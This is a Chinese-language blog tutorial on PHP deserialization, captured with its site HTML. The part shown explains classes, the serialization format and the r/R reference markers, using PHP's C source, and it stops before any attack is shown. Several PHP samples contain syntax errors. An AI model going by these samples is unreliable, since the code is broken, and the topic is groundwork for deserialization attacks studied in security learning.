href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/web/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web</span></a><a class="article-meta__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>后端漏洞</span></a></span></div></div><h1 class="post-title" itemprop="name headline">php反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-13T05:09:35.000Z" title="发表于 2024-05-13 13:09:35">2024-05-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-13T05:11:45.967Z" title="更新于 2024-05-13 13:11:45">2024-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>58分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a href="/tags/web/" tabindex="-1" itemprop="url">web</a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url">后端漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">php反序列化</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-13T05:09:35.000Z" title="发表于 2024-05-13 13:09:35">2024-05-13</time><time itemprop="dateCreated datePublished" datetime="2024-05-13T05:11:45.967Z" title="更新于 2024-05-13 13:11:45">2024-05-13</time></header><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h3><p>就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了</p>
<p>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中按顺序调用函数</p>
<h3 id="面向对象-1"><a href="#面向对象-1" class="headerlink" title="面向对象"></a>面向对象</h3><p>就是把现实中的事物都抽象为“对象”。每个对象是唯一的，且都可以拥有它的属性与行为。我们就可以通过调用这些对象的方法、属性去解决问题。</p>
<p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成整体，是对现实世界的抽象</p>
<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>类是对一组有相同数据和相同操作的对象的定义，是对象的模板，其包含的方法和数据描述一组对象的共同行为和属性。类是在对象之上的抽象，对象则是类的具体化，是类的实例。类可有其子类，也可有其他类，形成类层次结构</p>
<p>类是定义了一件事物的抽象特点，它将数据的形式以这些数据上的操作封装在一起。</p>
<p><code>对象是具有类类型的变量，是对类的实例</code></p>
<p>内部构成：成员变量（属性）+成员函数（方法）</p>
<p>属性：定义在类内部的变量  该变量的值对外是不可见的，但是可以通过方法访问  在类被实例化后，该变量即可成为对象的属性</p>
<p>方法：定义在类的内部，可用于访问对象的数据</p>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>让某个类型的对象获得另一个类型的对象的属性和方法。继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为</p>
<p>父类：一个类被其他类继承，可将该类称为父类（基类、超类）</p>
<p>子类：一个类继承其他类，则该类被称为子类（派生类）</p>
<h4 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;<span class="comment">//定义类（类名）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;<span class="comment">//声明成员变量（属性）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>&#123;<span class="comment">//声明成员函数（方法）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;<span class="comment">//$this:调用这个类中的属性时使用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;<span class="comment">//方法传参var可直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();<span class="comment">//new:实例化对象  把他赋值为对象cyj</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;name=<span class="string">&#x27;程咬金&#x27;</span>；<span class="comment">//赋值参数</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;sex=<span class="string">&#x27;男&#x27;</span>；</span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="title function_ invoke__">jineng</span>(<span class="string">&#x27;跳跳跳&#x27;</span>);<span class="comment">//调用方法</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cyj</span>);<span class="comment">//打印</span></span><br></pre></td></tr></table></figure>

<h4 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h4><ul>
<li>public：对外公开，访问级别最高</li>
<li>protected：只对同一个包中的类或者子类公开</li>
<li>默认：只对同一个包中的类公开</li>
<li>private：不对外公开，只能在对象内部访问，访问级别最低<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img-blog.csdnimg.cn/274e6b8cc40c4c66ad93056fe6c5991b.png" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex;<span class="comment">//不行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;age;<span class="comment">//不行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="title">extend</span> <span class="title">hero</span></span>&#123;<span class="comment">//子类</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$cyj2</span>=<span class="keyword">new</span> hero2;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj2</span>-&gt;<span class="title function_ invoke__">test</span>();<span class="comment">//sex不能触发</span></span><br></pre></td></tr></table></figure>

<p>方法也可以用修饰符</p>
<h2 id="序列化基础知识"><a href="#序列化基础知识" class="headerlink" title="序列化基础知识"></a>序列化基础知识</h2><p>序列化(serialization)（串行化）：是将变量转换为可保存或传输的字符串的过程；</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ba145d.png" alt="image-20240221185603468"></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th>例子</th>
<th>序列化结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">空字符</td>
<td>NULL</td>
<td>N；</td>
</tr>
<tr>
<td align="center">整型</td>
<td>666</td>
<td>i:666;</td>
</tr>
<tr>
<td align="center">浮点型</td>
<td>66.6</td>
<td>d:66.6;</td>
</tr>
<tr>
<td align="center">布朗型</td>
<td>true</td>
<td>b:1;</td>
</tr>
<tr>
<td align="center"></td>
<td>false</td>
<td>b:0;</td>
</tr>
<tr>
<td align="center">字符串</td>
<td>’benben‘</td>
<td>s:6(长度);”benben”</td>
</tr>
<tr>
<td align="center">数组</td>
<td>array(‘benben’,’laoli’)</td>
<td>a:2(参数数量)：{i:0(编号);s:6:”benben”;i:1;s:5:”laoli”;)}</td>
</tr>
</tbody></table>
<h3 id="r与R"><a href="#r与R" class="headerlink" title="r与R"></a>r与R</h3><p>当两个对象本来就是同一个对象时后出现的对象将会以小写<strong>r</strong>表示。<br>不过基础类型不受此条件限制，总是会被序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:1;&#125; // 基础类型</span></span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$y</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;stdClass&quot;:0:&#123;&#125;s:1:&quot;b&quot;;r:2;&#125;</span></span><br><span class="line"><span class="comment">// id(a) == id(b)，二者都是$y;</span></span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$x</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>;</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;r:1;s:1:&quot;b&quot;;r:1;&#125;</span></span><br></pre></td></tr></table></figure>

<p>而当PHP中的一个对象如果是对另一对象显式的<strong>引用</strong>，那么在同时对它们进行序列化时将通过大写<strong>R</strong>表示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>



<p><strong>分析：</strong></p>
<p>对于“同一个对象”，php直接对取出的对象引用进行了一次解引用，便将这个 <em><strong>对象</strong></em> 赋给了右值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;r:&quot;</span> uiv <span class="string">&quot;;&quot;</span>        &#123;</span><br><span class="line">    zend_long id;</span><br><span class="line">    *p = YYCURSOR;</span><br><span class="line">    <span class="keyword">if</span> (!var_hash) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    id = parse_uiv(start + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// 待会说 var_hash ，先看下面几行</span></span><br><span class="line">    <span class="comment">// r begin</span></span><br><span class="line">    <span class="keyword">if</span> (rval_ref == rval) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    ZVAL_DEREF(rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(rval_ref) != IS_OBJECT) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// r end</span></span><br><span class="line">    ZVAL_COPY(rval, rval_ref);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而对于“对象引用”，其反序列化过程与上面小r非常像，不一样的地方在于 r begin 和 r end 之间：</p>
<p>php并没有对取出的引用进行解引用，直接将这个 <em><strong>引用</strong></em> 赋给了右值。<br>如果取出的引用本身指向的是一个引用，php还会进一步跟到引用指向的对象，创建一个新的指向对应对象的引用，赋给右值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 略</span></span><br><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment">// R begin</span></span><br><span class="line"><span class="keyword">if</span> (Z_ISUNDEF_P(rval_ref) || (Z_ISREF_P(rval_ref) &amp;&amp; Z_ISUNDEF_P(Z_REFVAL_P(rval_ref)))) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Z_ISREF_P(rval_ref)) &#123;</span><br><span class="line">    zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*var_hash)-&gt;ref_props) &#123;</span><br><span class="line">        info = zend_hash_index_find_ptr((*var_hash)-&gt;ref_props, (<span class="type">zend_uintptr_t</span>)rval_ref);</span><br><span class="line">    &#125;</span><br><span class="line">    ZVAL_NEW_REF(rval_ref, rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (info) &#123; ZEND_REF_ADD_TYPE_SOURCE(Z_REF_P(rval_ref), info); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// R end</span></span><br><span class="line">ZVAL_COPY(rval, rval_ref);</span><br></pre></td></tr></table></figure>



<p><strong>R&#x2F;r后的数字：</strong></p>
<p>那么，R&#x2F;r后面跟的数字是怎么决定的呢？首先我们先来“黑箱分析”一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 1</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:2;&#125;               ⬇️ 注意这，变了</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:1;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">/* 压缩了一下（</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">  [1]=&gt; array(2) &#123;</span></span><br><span class="line"><span class="comment">    [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">    [1]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 2</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;               ⬇️ 同上</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:1;&#125; &#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#3 (2) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;a&quot;]=&gt; int(1)</span></span><br><span class="line"><span class="comment">  [&quot;b&quot;]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>相信大家定睛看两眼上面的例子就能猜出，R&#x2F;r后面的数字指代的是在 <em><strong>同一反序列化过程中</strong></em><br>出现过的第n个非键(key)对象（我又在瞎起名字了）</p>
<p>看过上面的源码以后很容易猜到，在反序列化过程中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>这一步正是上面取值的关键。在反序列化过程中我们看到 <code>php_var_unserialize_internal</code> 函数在一开头就进行了 <code>var_push(var_hash, rval);</code> 这样的操作（当然前提是反序列化的对象的标记不能是’R’，因为“引用”本身如果也计算在内，那么就有可能出现循环引用。浙恒河里），而 <code>var_push</code> 正是向列表 <code>var_hash</code> append一个新的元素。</p>
<blockquote>
<p><strong>其实</strong> <code>var_hash</code> <strong>并不单单是一个列表，只是本文为方便这么说罢了。</strong></p>
</blockquote>
<p>这时候就有同学要问了，数组的index是数字，对象的属性名是字符串，它们都存在于反序列化过程当中，为什么它们没有被append进 <code>var_hash</code> 呢？我们回头看一下 <code>var_push</code> 的条件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_hash &amp;&amp; (*p)[<span class="number">0</span>] != <span class="string">&#x27;R&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>后面那个’R’已经在恒河里了，那么前面那个 <code>var_hash</code> 非 NULL 的判断意义何在呢？<br>桥豆麻袋，<code>var_hash</code> 是哪里来的呢？<br><code>php_var_unserialize_internal</code> 的参数里有个宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNSERIALIZE_PARAMETER \</span></span><br><span class="line"><span class="meta">    zval *rval, const unsigned char **p, \</span></span><br><span class="line"><span class="meta">    const unsigned char *max, \</span></span><br><span class="line"><span class="meta">    php_unserialize_data_t *var_hash</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span>;</span><br></pre></td></tr></table></figure>

<p>自然而然地，我们回去看这个internal是怎么调用的，看看什么情况下传入的 <code>var_hash</code> 为 NULL：</p>
